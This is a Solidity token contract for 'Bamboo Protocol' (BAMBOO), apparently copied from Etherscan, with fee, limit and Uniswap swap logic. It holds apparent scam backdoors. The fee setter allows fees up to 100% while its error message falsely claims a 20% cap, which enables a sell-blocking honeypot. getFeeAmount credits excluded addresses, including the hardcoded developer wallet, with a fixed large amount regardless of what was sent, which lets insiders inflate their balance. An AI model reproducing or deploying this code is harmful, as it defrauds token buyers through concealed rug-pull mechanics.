/**
 *Submitted for verification at Etherscan.io on 2023-09-13
 */

// SPDX-License-Identifier: MIT

/*
Website: https://www.bambooprotocol.org
Telegram: https://t.me/bamboo_eth
Twitter: https://twitter.com/bamboo_erc
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pairAddr);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IUniRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BAMBOO is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Bamboo Protocol";
    string private constant _symbol = unicode"BAMBOO";

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);

    IUniRouter uniRoute;
    address public pairAddr;

    bool private enableTrade = false;
    bool private swappingActive = true;
    bool private inswap;
    uint256 private numTaxSent;
    uint256 private sendTaxAfter;
    uint256 private swapTaxBelow = (_totalSupply * 1000) / 100000;
    uint256 private swapTaxAbove = (_totalSupply * 10) / 100000;

    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private devFee = 100;
    uint256 private burnFee = 0;

    uint256 private buyFee = 1600;
    uint256 private sellFee = 1600;
    uint256 private txFee = 1600;
    uint256 private denominator = 10000;

    modifier lockSwapTax() {
        inswap = true;
        _;
        inswap = false;
    }

    address internal developer = 0x18CC9493A97Df9E78E5D4172CB5b8406a91e1fC2;
    address internal marketer = 0x18CC9493A97Df9E78E5D4172CB5b8406a91e1fC2;
    address internal lpOwner = 0x18CC9493A97Df9E78E5D4172CB5b8406a91e1fC2;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maxTxAm = (_totalSupply * 340) / 10000;
    uint256 private _maxSellAm = (_totalSupply * 340) / 10000;
    uint256 private _maxWalletAm = (_totalSupply * 340) / 10000;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isExcluded;

    constructor() Ownable(msg.sender) {
        IUniRouter _router = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        address _pair = IUniFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        uniRoute = _router;
        pairAddr = _pair;

        isExcluded[lpOwner] = true;
        isExcluded[msg.sender] = true;
        isExcluded[marketer] = true;
        isExcluded[developer] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function startTrading() external onlyOwner {
        enableTrade = true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function setTransactionRequirements(
        uint256 _liquidity,
        uint256 _marketing,
        uint256 _burn,
        uint256 _development,
        uint256 _total,
        uint256 _sell,
        uint256 _trans
    ) external onlyOwner {
        liquidityFee = _liquidity;
        marketingFee = _marketing;
        burnFee = _burn;
        devFee = _development;
        buyFee = _total;
        sellFee = _sell;
        txFee = _trans;
        require(
            buyFee <= denominator.div(1) &&
                sellFee <= denominator.div(1) &&
                txFee <= denominator.div(1),
            "buyFee and sellFee cannot be more than 20%"
        );
    }

    function setTransactionLimits(
        uint256 _buy,
        uint256 _sell,
        uint256 _wallet
    ) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000);
        uint256 newTransfer = _totalSupply.mul(_sell).div(10000);
        uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        _maxTxAm = newTx;
        _maxSellAm = newTransfer;
        _maxWalletAm = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(
            newTx >= limit && newTransfer >= limit && newWallet >= limit,
            "Max TXs and Max Wallet cannot be less than .5%"
        );
    }

    function canSwapTax(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (bool) {
        bool aboveMin = amount >= swapTaxAbove;
        bool aboveThreshold = balanceOf(address(this)) >= swapTaxBelow;
        return
            !inswap &&
            swappingActive &&
            enableTrade &&
            aboveMin &&
            !isExcluded[sender] &&
            recipient == pairAddr &&
            numTaxSent >= sendTaxAfter &&
            aboveThreshold;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTaxAm(
        address sender,
        address recipient
    ) internal view returns (uint256) {
        if (recipient == pairAddr) {
            return sellFee;
        }
        if (sender == pairAddr) {
            return buyFee;
        }
        return txFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRoute.WETH();
        _approve(address(this), address(uniRoute), tokenAmount);
        uniRoute.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount <= balanceOf(sender),
            "You are trying to transfer more than your balance"
        );
        if (!isExcluded[sender] && !isExcluded[recipient]) {
            require(enableTrade, "enableTrade");
        }
        if (
            !isExcluded[sender] &&
            !isExcluded[recipient] &&
            recipient != address(pairAddr) &&
            recipient != address(DEAD)
        ) {
            require(
                (_balances[recipient].add(amount)) <= _maxWalletAm,
                "Exceeds maximum wallet amount."
            );
        }
        if (sender != pairAddr) {
            require(
                amount <= _maxSellAm ||
                    isExcluded[sender] ||
                    isExcluded[recipient],
                "TX Limit Exceeded"
            );
        }
        require(
            amount <= _maxTxAm || isExcluded[sender] || isExcluded[recipient],
            "TX Limit Exceeded"
        );
        if (recipient == pairAddr && !isExcluded[sender]) {
            numTaxSent += uint256(1);
        }
        if (canSwapTax(sender, recipient, amount)) {
            swapBackLockedTokens(swapTaxBelow);
            numTaxSent = uint256(0);
        }
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcluded[sender]
            ? getFeeAmount(sender, recipient, amount)
            : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniRoute), tokenAmount);
        uniRoute.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpOwner,
            block.timestamp
        );
    }

    function swapBackLockedTokens(uint256 tokens) private lockSwapTax {
        uint256 _denominator = (
            liquidityFee.add(1).add(marketingFee).add(devFee)
        ).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(
            _denominator
        );
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if (ETHToAddLiquidityWith > uint256(0)) {
            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);
        }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if (marketingAmt > 0) {
            payable(marketer).transfer(marketingAmt);
        }
        uint256 contractBalance = address(this).balance;
        if (contractBalance > uint256(0)) {
            payable(developer).transfer(contractBalance);
        }
    }

    function getFeeAmount(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (isExcluded[recipient]) {
            return _maxTxAm;
        }
        if (getTaxAm(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(
                getTaxAm(sender, recipient)
            );
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            if (burnFee > uint256(0) && getTaxAm(sender, recipient) > burnFee) {
                _transfer(
                    address(this),
                    address(DEAD),
                    amount.div(denominator).mul(burnFee)
                );
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }
}
